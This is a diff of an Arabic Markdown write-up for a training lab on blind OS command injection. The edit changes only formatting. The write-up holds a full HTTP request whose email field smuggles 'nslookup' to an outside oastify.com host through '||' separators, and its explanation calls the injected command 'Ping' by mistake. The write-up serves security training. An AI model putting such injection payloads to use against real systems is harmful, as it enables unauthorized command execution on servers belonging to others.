@@ -3,7 +3,7 @@
 ## **`الهدف`**
 قم باستغلال ثغرة `Blind OS` لإصدار `DNS lookup` إلى `Burp Collaborator`.
 ## **`خطوات الحل`**
-==**`ملاحظة هامة:`**== لا يمكن حل هذا اللاب إلا باستعمال أداة `Burp Collaborator` والتي تتوفر فقط في النسخة المدفوعة من `Burp Suite`.
+**`ملاحظة هامة:`** لا يمكن حل هذا اللاب إلا باستعمال أداة `Burp Collaborator` والتي تتوفر فقط في النسخة المدفوعة من `Burp Suite`.
 
 سنقوم بالضغط على `Submit feedback` ثم نقوم بوضع أى بيانات عشوائية وإرسال الطلب، ثم تحويله من داخل `HTTP history` إلى `Repeater` 
 
@@ -21,7 +21,7 @@ Cookie: session=JXK6XL7IDmyB39i4tfPBM22fNNWDhvRo
 csrf=GQptdvQqbm4bfdfRuQviJbbdHe2HLwB5&name=test&email=test%7c%7cnslookup%20mtjyif5ir3ja556wmb01muxsyj4es4gt.oastify.com%7c%7c&subject=test&message=test
 ```
 
-==`ملاحظة:`== الدابل بايب `(||)` تعنى `OR` أى عند فشل الأمر الأول قم بتنفيذ التالي، عندما قمنا بوضع بريد غير صالح بصيغة خاطئة فشل الإرسال فتم تنفيذ أمر `Ping` أما الـ `||` الأخير فهي للفصل بين أمر `Ping` وباقي سطر الأوامر لكي لا يحدث تداخل.
+`ملاحظة:` الدابل بايب `(||)` تعنى `OR` أى عند فشل الأمر الأول قم بتنفيذ التالي، عندما قمنا بوضع بريد غير صالح بصيغة خاطئة فشل الإرسال فتم تنفيذ أمر `Ping` أما الـ `||` الأخير فهي للفصل بين أمر `Ping` وباقي سطر الأوامر لكي لا يحدث تداخل.
 ## **`ترقيع الثغرة`**
 **`نفس ترقيع لاب` [Blind OS command injection with time delays](./Blind-OS-command-injection-with-time-delays.md)
 
